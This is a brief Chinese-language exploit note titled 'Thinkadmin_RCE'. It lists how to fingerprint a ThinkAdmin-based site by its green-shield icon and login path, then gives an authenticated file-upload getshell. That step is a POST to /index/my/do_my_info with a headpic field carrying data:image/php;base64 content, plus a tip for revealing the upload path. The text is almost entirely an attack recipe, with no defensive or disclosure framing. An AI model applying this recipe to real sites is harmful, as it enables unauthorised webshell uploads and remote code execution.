# Thinkadmin_RCE

---

特征：

```
图标是小绿盾，中间一个勾
登陆页路径：/index/user/login.html
```



前台上传getshell

```
登陆后
/index/my/do_my_info
post:（上传）
headpic=data:image/php;base64,xxxxxx
将post改成get可以查看上传路径
```

